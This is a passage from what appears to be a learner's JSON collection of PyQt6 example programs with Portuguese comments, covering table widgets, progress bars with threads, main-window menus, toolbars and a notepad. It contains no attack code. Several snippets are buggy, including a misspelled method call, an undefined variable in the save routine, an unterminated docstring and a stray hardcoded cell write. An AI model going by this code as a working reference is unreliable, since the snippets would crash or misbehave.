createMenu(self):\n\t\t#Cria aplica\u00e7\u00f5es no cabe\u00e7alho horizontal \n\t\t\n\t\t#Indica que o apicativo forneca sua propria barra de menus\n\t\tself.menuBar().setNativeMenuBar(False)\n\t\t\n\t\t#Cria o menu e adiciona a\u00e7\u00f5es\n\t\tfile_menu = self.menuBar().addMenu('File')\n\t\tfile_menu.addAction(self.quit_act)\n\t\t\n\t\t#Cria o menu e aciciona as a\u00e7\u00f5es\n\t\ttable_menu = self.menuBar().addMenu('Table')\n\t\ttable_menu.addAction(self.add_row_above_act)\n\t\ttable_menu.addAction(self.add_row_bellow_act)\n\t\ttable_menu.addSeparator()\n\t\ttable_menu.addAction(self.add_col_before_act)\n\t\ttable_menu.addAction(self.add_col_after_act)\n\t\ttable_menu.addSeparator()\n\t\ttable_menu.addAction(self.delete_row_act)\n\t\ttable_menu.addAction(self.delete_col_act)\n\t\ttable_menu.addSeparator()\n\t\ttable_menu.addAction(self.clear_table_act)\n\t\t\n\tdef contextMenuEvent(self, event):\n\t\tcontext_menu = QMenu(self)\n\t\tcontext_menu.addAction(self.add_row_above_act)\n\t\tcontext_menu.addAction(self.add_row_bellow_act)\n\t\tcontext_menu.addSeparator()\n\t\tcontext_menu.addAction(self.add_col_before_act)\n\t\tcontext_menu.addAction(self.add_col_after_act)\n\t\tcontext_menu.addSeparator()\n\t\tcontext_menu.addAction(self.delete_row_act)\n\t\tcontext_menu.addAction(self.delete_col_act)\n\t\tcontext_menu.addSeparator()\n\t\t\n\t\t#Cria a\u00e7\u00f5es espec\u00edficas para o contexto do menu\n\t\tcopy_act = context_menu.addAction('Copy')\n\t\tpaste_act = context_menu.addAction('Paste')\n\t\tcontext_menu.addSeparator()\n\t\tcontext_menu.addAction(self.clear_table_act)\n\t\t\n\t\t#Executa o context_menu e retorna a a\u00e7\u00e3o selecionada\n\t\t#mapToGlobal() traduz a posi\u00e7\u00e3o das coordenadas da janela\n\t\t#para a tela global\n\t\t#Dessa forma podemos detectar se um clique com o botao direito\n\t\t#ocorreu dentro da GUI e exibe um contexto\n\t\taction = context_menu.exec(\n\t\t\tself.mapToGlobal(event.pos()))\n\t\t\t\n\t\t#Checa as a\u00e7\u00f5es selecionadas no context_menu que n\u00e3o foram\n\t\t#criadas na barra menu\n\t\tif action == copy_act:\n\t\t\tself.copyItem()\n\t\tif action == paste_act:\n\t\t\tself.pasteItem()\n\t\t\t\n\tdef changeHeader(self):\n\t\t#Altera os titulos das colunas clicando duas vezes\n\t\tcol = self.table_widget.currentColumn()\n\t\t\n\t\ttext, ok = QInputDialog.getText(\n\t\t\tself, 'Enter Header', 'Header Text:')\n\t\tif ok and text != '':\n\t\t\tself.table_widget.setHorizontalHeaderItem(\n\t\t\t\tcol, QTableWidgetItem(text))\n\t\t\t\t\n\tdef copyItem(self):\n\t\t#Se a celula selecionada n\u00e3o est\u00e1 vazia, armazene o texto\n\t\tif self.table_widget.currentItem() != None:\n\t\t\ttext = self.table_widget.currentItem().text()\n\t\t\tself.item_text = text\n\t\n\tdef pasteItem(self):\n\t\tif self.item_text != None:\n\t\t\trow = self.table_widget.currentRow()\n\t\t\tcolumn = self.table_widget.currentColumn()\n\t\t\t\n\t\t\tself.table_widget.setItem(\n\t\t\t\trow, column, QTableWidgetItem(self.item_text))\n\t\t\t\n\t\t\tself.table_widget.setItem(\n\t\t\t\t1, 0, QTableWidgetItem('Kalani'))\n\t\t\t\t\n\tdef addRowAbove(self):\n\t\tcurrent_row = self.table_widget.currentRow()\n\t\tself.table_widget.insertRow(current_row)\n\t\t\n\tdef addRowBellow(self):\n\t\tcurrent_row = self.table_widget.currentRow()\n\t\tself.table_widget.insertRow(current_row + 1)\n\t\t\n\tdef addColumnBefore(self):\n\t\tcurrent_col = self.table_widget.currentColumn()\n\t\tself.table_widget.insertColumn(current_col)\n\t\t\n\tdef addColumnAfter(self):\n\t\tcurrent_col = self.table_widget.currentColumn()\n\t\tself.table_widget.insertColumn(current_col + 1)\n\t\t\n\tdef deleteRow(self):\n\t\tcurrent_row = self.table_widget.currentRow()\n\t\tself.table_widget.removeRow(current_row)\n\t\t\n\tdef deleteColumn(self):\n\t\tcurrent_col = self.table_widget.currentColun()\n\t\tself.table_widget.removeColumn(current_col)\n\t\t\n\tdef clearTable(self):\n\t\tself.table_widget.clear()\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\t\t\n\t\t\n", "categoria": "PyQt6"}, "QTableWidget - tabela mostrar dados": {"categoria": "PyQt6", "codigo": "import sys, json\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLabel, QVBoxLayout,\nQTableWidget, QTableWidgetItem)\nfrom PyQt6.QtGui import QFont\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(1000, 300)\n\t\tself.setWindowTitle('Estoque')\n\t\tself.estoque = {}\n\t\tself.carregar_estoque()\n\t\tself.setUpMainWindow()\n\t\tself.showMaximized()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tlinhas = len(list(self.estoque.keys()))\n\t\testoque_label = QLabel('Estoque')\n\t\testoque_label.setFont(QFont('Arial', 15))\n\t\t\n\t\tself.estoque_tabela = QTableWidget(linhas, 9)\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(estoque_label)\n\t\tmain_v_box.addWidget(self.estoque_tabela)\n\t\tself.setLayout(main_v_box)\n\t\tself.setTabela()\n\t\t\n\tdef setTabela(self):\n#####################################################################\n\t\t''' Isso faz com que a tabela atualiza a suas linhas depois de criada\n\t\t'\n\t\tself.estoque_tabela.setRowCount(len(list(dicionario)))\n\t\tself.estoque_tabela.setColumnCount(len(list(dicionario)))\n\t\t\n\t\t#Setar o cabe\u00e7alhos de cada coluna\n\t\t#C\u00f3digo\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t0, QTableWidgetItem('C\u00f3digo'))\n\t\t\t\n\t\t#Produto\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t1, QTableWidgetItem('Produto'))\n\t\t\t\n\t\t#Preco (valor)\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t2, QTableWidgetItem('Pre\u00e7o'))\n\t\t\t\n\t\t#Custo \n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t3, QTableWidgetItem('Custo'))\n\t\t\t\n\t\t#Quantidade\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t4, QTableWidgetItem('Quantidade'))\n\t\t\t\n\t\t#Categoria\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t5, QTableWidgetItem('Categoria'))\n\t\t\t\n\t\t#SubCategoria\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t6, QTableWidgetItem('SubCategoria'))\n\t\t\t\n\t\t#Marca\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t7, QTableWidgetItem('Marca'))\n\t\t\t\n\t\t#Fornecedor\n\t\tself.estoque_tabela.setHorizontalHeaderItem(\n\t\t\t8, QTableWidgetItem('Fornecedor'))\n\t\t\t\n\t\t#Colocar os itens e informa\u00e7\u00f5es do dicion\u00e1rio na Tabela\n\t\tvar = 0\n\t\tfor item, info in self.estoque.items():\n\t\t\t\n\t\t\t#C\u00f3digo\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 0, QTableWidgetItem(info['codigo']))\n\t\t\t\n\t\t\t#Produto\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 1, QTableWidgetItem(item))\n\t\t\t\t\n\t\t\t#Pre\u00e7o\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 2, QTableWidgetItem(f'R$ {info[\"valor\"]}'))\n\t\t\t\t\n\t\t\t#Custo \n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 3, QTableWidgetItem(f'R$ {info[\"custo\"]}'))\n\t\t\t\t\n\t\t\t#Quantidade\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 4, QTableWidgetItem(f'{info[\"quantidade\"]}'))\n\t\t\t\t\n\t\t\t#Categoria \n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 5, QTableWidgetItem(info['categoria']))\n\t\t\t\t\n\t\t\t#SubCategoria\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 6, QTableWidgetItem(info['subcategoria']))\n\t\t\t\t\n\t\t\t#Marca\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 7, QTableWidgetItem(info['marca']))\n\t\t\t\t\n\t\t\t#Fornecedor\n\t\t\tself.estoque_tabela.setItem(\n\t\t\t\tvar, 8, QTableWidgetItem(info['fornecedor']))\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\tvar += 1\n\t\t\t\n\t\tself.estoque_tabela.resizeColumnsToContents()\n\t\n\t\n\t\n\tdef carregar_estoque(self):\n\t\ttry:\n\t\t\twith open('estoque.json', 'r') as file:\n\t\t\t\tcontent = file.read()\n\t\t\t\tif content:\n\t\t\t\t\tself.estoque.update(json.loads(content))\n\t\t\n\t\texcept (FileNotFoundError, json.JSONDecodeError):\n\t\t\tprint('N\u00e3o foi poss\u00edvel carregar os dados de estoque')\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\n\n\n\n\n\n\nVERS\u00c2O OTIMIZADA PARA QTABLEWIDGET()\n###############################################################\nimport sys, sqlite3\nfrom PyQt6.QtWidgets import (QWidget, QApplication, QTableWidget, QTableWidgetItem,\nQVBoxLayout)\nfrom PyQt6.QtGui import QFont\n\n\nclass Ver(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(350, 400)\n\t\tself.setWindowTitle('Visualiza\u00e7\u00e3o')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\t\t\n\tdef setUpMainWindow(self):\n\t\ttry:\n\t\t\tconn = sqlite3.connect('arc.db')\n\t\t\tcursor = conn.cursor()\n\t\t\tcursor.execute('SELECT * FROM opcoes ORDER BY valor;')\n\t\t\tdata = cursor.fetchall()\n\t\t\tcolumns = [description[0].title() for description in cursor.description]\n\t\t\tconn.close()\n\t\t\t\n\t\t\t'''QTableWidget'''\n\t\t\tself.table_widget = QTableWidget()\n\t\t\tself.table_widget.setRowCount(len(data))\n\t\t\tself.table_widget.setColumnCount(len(columns))\n\t\t\tself.table_widget.setHorizontalHeaderLabels(columns)\n\t\t\t\n\t\t\tfor row_index, row_data in enumerate(data):\n\t\t\t\tfor col_index, col_data in enumerate(row_data):\n\t\t\t\t\tself.table_widget.setItem(row_index, col_index, QTableWidgetItem(str(col_data).title()))\n\t\t\t\n\t\t\tself.table_widget.resizeColumnsToContents()\n\t\t\t\t\n\t\t\t\t\t\t\n\t\t\tlayout = QVBoxLayout()\n\t\t\tlayout.addWidget(self.table_widget)\n\t\t\tself.setLayout(layout)\n\t\texcept:\n\t\t\tpass\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = Ver()\n\tsys.exit(app.exec())\n"}, "QProgressBar() - Barra de progresso e calculo massivo": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QVBoxLayout,\nQPushButton, QProgressBar)\nfrom PyQt6.QtCore import Qt, QThread, QTimer, pyqtSignal\n\nclass WorkerThread(QThread):\n\t#Emite um sinal\n\tupdate_progress = pyqtSignal(int)\n\t\n\tdef __init__(self, total_steps):\n\t\tsuper().__init__()\n\t\t#Entrada na fun\u00e7\u00e3o para fazer os calculos\n\t\tself.total_steps = total_steps\n\t\n\t#M\u00e9todo que faz a conta\n\tdef run(self):\n\t\t#self.total_steps = 100000 + 1\n\t\tfor step in range(1, self.total_steps + 1):\n\t\t\t#cada vez que o ciclo estiver feito emitira o sinal\n\t\t\t#no valor do step [ 1.....100000]\n\t\t\tself.update_progress.emit(step)\n\t\t\t\n\t\t\nclass ProgressBarExemplo(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(150, 150)\n\t\tself.setWindowTitle('QProgressBar')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.start_botao = QPushButton('Fazer Calculo')\n\t\tself.start_botao.clicked.connect(self.iniciar_calculo)\n\t\t\n\t\tself.barra_progresso = QProgressBar()\n\t\t\n\t\t\n\t\tmain_v_box = QVBoxLayout()\n\t\tmain_v_box.addWidget(self.barra_progresso)\n\t\tmain_v_box.addWidget(self.start_botao)\n\t\tself.setLayout(main_v_box)\n\t\t\n\tdef iniciar_calculo(self):\n\t\t#seta o valor minimo da barra de carregamento\n\t\t#Seta o valor m\u00e1ximo da barra de carregamento\n\t\t#O valor m\u00e1ximo \u00e9 quantos pontos a barra vai ter\n\t\tself.barra_progresso.setValue(0)\n\t\tself.barra_progresso.setMaximum(100000)\n\t\t\n\t\t#Chaman do a fun\u00e7\u00e3o, informando a quantidade de repedi\u00e7\u00f5es\n\t\tself.worker_thread = WorkerThread(total_steps = 100000)\n\t\t#Cada vez que a conta for feita emite um sinal e ao emiir\n\t\t#Chama a fun\u00e7\u00e3o atualizar barra\n\t\tself.worker_thread.update_progress.connect(self.atualizar_barra)\n\t\t#Funcionar a fun\u00e7\u00e3o que faz a conta\n\t\tself.worker_thread.start()\n\t\n\t#O valor \u00e9 o n\u00famero do sinal emitido na classe\n\tdef atualizar_barra(self, value):\n\t\t\n\t\tself.barra_progresso.setValue(value)\n\t\tif value == self.worker_thread.total_steps:\n\t\t\t#Sai da classe que faz a conta\n\t\t\tself.worker_thread.quit()\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = ProgressBarExemplo()\n\tsys.exit(app.exec())\n\t\t\n", "categoria": "PyQt6"}, "QThread - calculo massivo GUI signal": {"codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QWidget, QLineEdit, \nQPushButton, QLabel, QHBoxLayout)\nfrom PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal\n\nclass WorkerThread(QThread):\n\tsinal_resultado = pyqtSignal(float)\n\tdef __init__(self, numero_1, numero_2):\n\t\tsuper().__init__()\n\t\tself.numero_1 = numero_1\n\t\tself.numero_2 = numero_2\n\t\n\tdef run(self):\n\t\tresultado_final = (self.numero_1 * self.numero_2)\n\t\tfor i in range(1000000000):\n\t\t\tresultado_final += 1\n\t\t\n\t\tself.sinal_resultado.emit(resultado_final)\n\nclass MainWindow(QWidget):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(150, 150)\n\t\tself.setWindowTitle('Calculadora')\n\t\tself.setUpMainWindow()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.numero1Edit = QLineEdit()\n\t\tself.numero2Edit = QLineEdit()\n\t\tself.resultado_label = QLabel('---')\n\t\tcalcular_botao = QPushButton('Calcular')\n\t\tcalcular_botao.clicked.connect(self.iniciar_calculo)\n\t\t\n\t\tmain_h_box = QHBoxLayout()\n\t\tmain_h_box.addWidget(self.numero1Edit)\n\t\tmain_h_box.addWidget(self.numero2Edit)\n\t\tmain_h_box.addWidget(self.resultado_label)\n\t\tmain_h_box.addWidget(calcular_botao)\n\t\tself.setLayout(main_h_box)\n\t\t\n\tdef iniciar_calculo(self):\n\t\ttry:\n\t\t\tnumero_1v = float(self.numero1Edit.text())\n\t\t\tnumero_2v = float(self.numero2Edit.text())\n\t\t\n\t\t\tself.worker_thread = WorkerThread(numero_1 = numero_1v,\n\t\t\t\t\t\t\t\t\tnumero_2 = numero_2v)\n\t\t\tself.worker_thread.sinal_resultado.connect(self.resultado)\n\t\t\tself.worker_thread.start()\n\t\texcept:\n\t\t\tpass\n\t\t\n\tdef resultado(self, value):\n\t\tself.resultado_label.setText(str(value))\n\n\t\t\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\t\t\n", "categoria": "PyQt6"}, "QMainWindow - janela com barra de ferramentas": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, \nQTextEdit, QLabel, QVBoxLayout, QInputDialog, QFontDialog,\nQColorDialog, QFileDialog)\nfrom PyQt6.QtGui import QAction, QIcon\n\nclass MainWindow(QMainWindow):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(450, 350)\n\t\tself.setWindowTitle('File')\n\t\t\n\t\tself.setUpMainWindow()\n\t\tself.createActions()\n\t\tself.createMenu()\n\t\tself.createCentralWidget()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.textoLabel = QLabel('Texto abaixo')\n\t\tself.textEd = QTextEdit()\n\t\t\n\t\tself.main_v_box = QVBoxLayout()\n\t\tself.main_v_box.addWidget(self.textoLabel)\n\t\tself.main_v_box.addWidget(self.textEd)\n\n\t\t\n\t\t\n\t\t\n\t\t\n\tdef createActions(self):\n\t\tself.quit_act = QAction(QIcon('images/undo.png'),'Quit')\n\t\tself.quit_act.setShortcut('Ctrl+Q')\n\t\tself.quit_act.triggered.connect(self.close)\n\t\t\n\t\tself.input_act = QAction('Adicionar Texto')\n\t\tself.input_act.setShortcut('Ctrl+A')\n\t\tself.input_act.triggered.connect(self.abrir_janela)\n\t\t\n\tdef createMenu(self):\n\t\tself.menuBar().setNativeMenuBar(False)\n\t\t\n\t\tfile_menu = self.menuBar().addMenu('File')\n\t\tfile_menu.addAction(self.quit_act)\n\t\tfile_menu.addAction(self.input_act)\n\t\t\n\tdef createCentralWidget(self):\n\t\t\n\t\tcontainer = QWidget()\n\t\tcontainer.setLayout(self.main_v_box)\n\t\tself.setCentralWidget(container)\n\t\t\n\tdef abrir_janela(self):\n\t\t#getMultiLineText() \n\t\t#getText() 'qqq'\n\t\t#getDouble()  '0.00'\n\t\t#getItem() '001'\n\t\t\n\t\tfine_text, ok = QInputDialog.getText(\n\t\t\tself, 'Search Text', 'Find:')\n\t\t\t\n\t\tfont, ok = QFontDialog.getFont()\n\t\n\t\t\n\t\tcolor = QColorDialog.getColor()\n\t\t\n\t\tfile_name, ok = QFileDialog.getOpenFileName()\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n\n###################################################################\nimport sys\nfrom PyQt6.QtWidgets import (QApplication, QMainWindow, QTextEdit, QDockWidget, QLabel, QVBoxLayout, QWidget, QToolBar)\nfrom PyQt6.QtGui import QIcon, QAction\nfrom PyQt6.QtCore import Qt\nclass MainWindow(QMainWindow):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(800, 600)\n\t\tself.setWindowTitle('QMainWindow Example')\n\t\t'''\n\t\tCada parte \u00e9 criada em uma fun\u00e7\u00e3o diferente\n\t\t'''\n\t\tself.setUpMainWindow()\n\t\tself.createActions()\n\t\tself.createMenu()\n\t\tself.createToolBar()\n\t\tself.createDockWidget()\n\t\tself.createStatusBar()\n\t\t\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\t'''Cria e organiza os widgets na janela principal,\n\t\tcolocamos o widget que queremos ou layout, e setamos\n\t\to sentralWidget.\n\t\t'''\n\t\tself.central_widget = QTextEdit()\n\t\tself.setCentralWidget(self.central_widget)\n\t\t\n\tdef createActions(self):\n\t\t'''Cria os bot\u00f5es e conecta as fun\u00e7\u00f5es'''\n\t\tself.quit_act = QAction(QIcon('path/to/quit_icon.png'), '&Quit')\n\t\tself.quit_act.setShortcut('Ctrl+Q')\n\t\tself.quit_act.triggered.connect(self.close)\n\t\t\n\t\tself.new_act = QAction(QIcon('path/to/new_icon.png'), '&New')\n\t\tself.new_act.setShortcut('Ctrl+N')\n\t\t\n\t\tself.open_act = QAction(QIcon('path/to/open_icon.png'), '&Open')\n\t\tself.open_act.setShortcut('Ctrl+O')\n\t\t\n\t\tself.save_act = QAction(QIcon('path/to/save_icon.png'), '&Save')\n\t\tself.save_act.setShortcut('Ctrl+S')\n\t\t\n\t\tself.docker_act = QAction('Docker', self, checkable=True)\n\t\tself.docker_act.setChecked(True)\n\t\tself.docker_act.triggered.connect(self.docker)\n\t\t\n\tdef createMenu(self):\n\t\t'''\n\t\tCriamos o menu e as op\u00e7\u00f5es que v\u00e3o dentro do menu, \n\t\tas op\u00e7\u00f5es s\u00e3o Actions criados anteriormente.\n\t\tNesse caso o add, j\u00e1 nas mesma linha do self.menuBar(),\n\t\tmas ele pode vir na ultima linha como self.addMenu('File')\n\t\t\n\t\t'''\n\t\tself.menuBar().setNativeMenuBar(False)\n\t\t\n\t\tfile_menu = self.menuBar().addMenu('File')\n\t\tfile_menu.addAction(self.new_act)\n\t\tfile_menu.addAction(self.open_act)\n\t\tfile_menu.addAction(self.save_act)\n\t\tfile_menu.addSeparator()\n\t\tfile_menu.addAction(self.quit_act)\n\t\t\n\t\t\n\tdef createToolBar(self):\n\t\t'''\n\t\tCriamos as ferramentas no ToolBar(), \n\t\tno final, colocamos o conte\u00fado dentro do toolbar\n\t\tcom o self.addToolBar(objeto)\n\t\t\n\t\t'''\n\t\tself.tool_bar = QToolBar('Main Toolbar')\n\t\tself.tool_bar.addAction(self.new_act)\n\t\tself.tool_bar.addAction(self.open_act)\n\t\tself.tool_bar.addAction(self.save_act)\n\t\tself.tool_bar.addAction(self.docker_act)\n\t\tself.addToolBar(self.tool_bar)\n\t\n\tdef createDockWidget(self):\n\t\t'''\n\t\t\tCriamos o dock, que \u00e9 um tipo de janela que pode ser movida\n\t\tpara dentro, para fora e muda de lugar na interface.\n\t\tPrimeiro criamos o objeto, ajustamos a posi\u00e7\u00e3o inicial do\n\t\tobjeto, fazemos o widget que vai receber o layout, \n\t\te por ultimo setamos o self.dock_widget com o quadrado\n\t\tcontendo o layout\n\t\t\n\t\t'''\n\t\tself.dock_widget = QDockWidget('Dockable', self)\n\t\tself.addDockWidget(Qt.DockWidgetArea.RightDockWidgetArea, self.dock_widget)\n\t\t#self.addDockWidget(Qt.DockWidgetArea.LeftDockWidgetArea, self.dock_widget)\n\t\t#self.addDockWidget(Qt.DockWidgetArea.TopDockWidgetArea, self.dock_widget)\n\t\t#self.addDockWidget(Qt.DockWidgetArea.BottomDockWidgetArea, self.dock_widget)\n\t\t\n\t\tdock_widget_content = QWidget()\n\t\tdock_layout = QVBoxLayout()\n\t\tdock_layout.addWidget(QLabel('Dock Widget Content'))\n\t\tdock_widget_content.setLayout(dock_layout)\n\t\t\n\t\tself.dock_widget.setWidget(dock_widget_content)\n\t\t\n\tdef createStatusBar(self):\n\t\t'''\n\t\tNesse caso aqui, caso queira que a mensagem seja reexibida\n\t\tpor\u00e9m com uma nova informa\u00e7\u00e3o, \u00e9 apenas chamar a\n\t\tself.status_bar.showMessage('Nova mensagem')\n\t\t'''\n\t\tself.status_bar = self.statusBar()\n\t\tself.status_bar.showMessage('Ready')\n\t\t\n\tdef docker(self):\n\t\tif self.docker_act.isChecked():\n\t\t\tself.dock_widget.show()\n\t\t\t\n\t\telse:\n\t\t\tself.dock_widget.hide()\n\t\t\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n\n"}, "QMainWindow x QTextEdit()": {"categoria": "PyQt6", "codigo": "import sys\nfrom PyQt6.QtWidgets import (QApplication, QMainWindow,\nQMessageBox, QTextEdit, QFileDialog, QInputDialog,\nQFontDialog, QColorDialog)\nfrom PyQt6.QtCore import Qt\nfrom PyQt6.QtGui import QIcon, QTextCursor, QColor, QAction\n\nclass MainWindow(QMainWindow):\n\tdef __init__(self):\n\t\tsuper().__init__()\n\t\tself.initializeUI()\n\t\n\tdef initializeUI(self):\n\t\tself.setMinimumSize(400, 500)\n\t\tself.setWindowTitle('5.1 - Rich Text NotePad Gui')\n\t\t\n\t\tself.setUpMainWindow()\n\t\tself.createActions()\n\t\tself.createMenu()\n\t\tself.show()\n\t\t\n\tdef setUpMainWindow(self):\n\t\tself.text_edit = QTextEdit()\n\t\tself.text_edit.textChanged.connect(self.removeHighlights)\n\t\tself.setCentralWidget(self.text_edit)\n\t\t\n\tdef createActions(self):\n\t\t#Criando a\u00e7\u00f5es para o menu\n\t\tself.new_act = QAction('Novo')\n\t\tself.new_act.setShortcut('Ctrl+N')\n\t\tself.new_act.triggered.connect(self.clearText)\n\t\t\n\t\tself.open_act = QAction('Abrir')\n\t\tself.open_act.setShortcut('Ctrl+O')\n\t\tself.open_act.triggered.connect(self.openFile)\n\t\n\t\tself.save_act = QAction('Salvar')\n\t\tself.save_act.setShortcut('Ctrl+S')\n\t\tself.save_act.triggered.connect(self.saveToFile)\n\t\n\t\tself.quit_act = QAction('Sair sem salvar')\n\t\tself.quit_act.setShortcut('Ctrl+K')\n\t\tself.quit_act.triggered.connect(self.close)\n\t\t\n\t\t#Criando a\u00e7\u00f5es para o menu de edi\u00e7\u00f5es\n\t\tself.undo_act = QAction('Desfazer')\n\t\tself.undo_act.setShortcut('Ctrl+Z')\n\t\tself.undo_act.triggered.connect(self.text_edit.undo)\n\t\t\n\t\tself.redo_act = QAction('Refazer')\n\t\tself.redo_act.setShortcut('Ctrl+Shift+Z')\n\t\tself.redo_act.triggered.connect(self.text_edit.redo)\n\t\t\n\t\tself.cut_act = QAction('Cortar')\n\t\tself.cut_act.setShortcut('Ctrl+X')\n\t\tself.cut_act.triggered.connect(self.text_edit.cut)\n\t\t\n\t\tself.copy_act = QAction('Copiar')\n\t\tself.copy_act.setShortcut('Ctrl+C')\n\t\tself.copy_act.triggered.connect(self.text_edit.copy)\n\t\t\n\t\tself.paste_act = QAction('Colar')\n\t\tself.paste_act.setShortcut('Ctrl+V')\n\t\tself.paste_act.triggered.connect(self.text_edit.paste)\n\t\t\n\t\tself.find_act = QAction('Procurar no texto')\n\t\tself.find_act.setShortcut('Ctrl+F')\n\t\tself.find_act.triggered.connect(self.searchText)\n\t\t\n\t\t#Fazendo o menu ferramentas\n\t\tself.font_act = QAction('Fonte')\n\t\tself.font_act.setShortcut('Ctrl+T')\n\t\tself.font_act.triggered.connect(self.chooseFont)\n\t\t\n\t\tself.color_act = QAction('Color da fonte')\n\t\tself.color_act.setShortcut('Ctrl+Shift+C')\n\t\tself.color_act.triggered.connect(self.chooseFontColor)\n\t\t\n\t\tself.highlight_act = QAction('Marca texto')\n\t\tself.highlight_act.setShortcut('Ctrl+Shift+H')\n\t\tself.highlight_act.triggered.connect(\n\t\t\tself.chooseFontBackgroundColor)\n\t\t\n\t\t#Criando a\u00e7oes para ajuda\n\t\tself.about_act = QAction('Sobre')\n\t\tself.about_act.triggered.connect(self.aboutDialog)\n\t\t\n\tdef createMenu(self):\n\t\tself.menuBar().setNativeMenuBar(False)\n\t\t\n\t\tfile_menu = self.menuBar().addMenu('Arquivo')\n\t\tfile_menu.addAction(self.new_act)\n\t\tfile_menu.addSeparator()\n\t\tfile_menu.addAction(self.open_act)\n\t\tfile_menu.addSeparator()\n\t\tfile_menu.addAction(self.save_act)\n\t\tfile_menu.addSeparator()\n\t\tfile_menu.addAction(self.quit_act)\n\t\t\n\t\tedit_menu = self.menuBar().addMenu('Editar')\n\t\tedit_menu.addAction(self.undo_act)\n\t\tedit_menu.addAction(self.redo_act)\n\t\tedit_menu.addSeparator()\n\t\tedit_menu.addAction(self.cut_act)\n\t\tedit_menu.addAction(self.paste_act)\n\t\tedit_menu.addAction(self.cut_act)\n\t\tedit_menu.addAction(self.find_act)\n\t\t\n\t\ttool_menu = self.menuBar().addMenu('Ferramenta')\n\t\ttool_menu.addAction(self.font_act)\n\t\ttool_menu.addAction(self.color_act)\n\t\ttool_menu.addAction(self.highlight_act)\n\t\t\n\t\thelp_menu = self.menuBar().addMenu('Sobre')\n\t\thelp_menu.addAction(self.about_act)\n\t\t\n\tdef clearText(self):\n\t\tanswer = QMessageBox.question(self, 'Limpar o texto', \n\t\t'Aten\u00e7\u00e3o o texto ser\u00e1 apagado',\n\t\tQMessageBox.StandardButton.Yes |\\\n\t\tQMessageBox.StandardButton.No,\n\t\tQMessageBox.StandardButton.No)\n\t\t\n\t\tif answer == QMessageBox.StandardButton.Yes:\n\t\t\tself.text_edit.clear()\n\t\t\t\n\tdef openFile(self):\n\t\tfile_name, _ = QFileDialog.getOpenFileName(\n\t\t\tself, 'Abrir arquivo', '',\n\t\t\t'Text Files (*txt);; HTML Files (*.html)')\n\t\t\t\n\t\tif file_name:\n\t\t\twith open(file_name, 'r') as file:\n\t\t\t\tnotepad_text = file.read()\n\t\t\t\n\t\t\tself.text_edit.setText(notepad_text)\n\t\t\t\n\tdef saveToFile(self):\n\t\tfile_name, _ = QFileDialog.getSaveFileName(\n\t\t\tself, 'Salvar arquivo', '',\n\t\t\t'Text Files (*txt);; HTML Files (*.html)')\n\t\t\t\n\t\tif file_name.endswith('.txt'):\n\t\t\tnotepad = self.text_edit.toPlainText()\n\t\t\twith open(file_name, 'w') as file:\n\t\t\t\tfile.write(notepad_text)\n\t\t\t\t\n\tdef 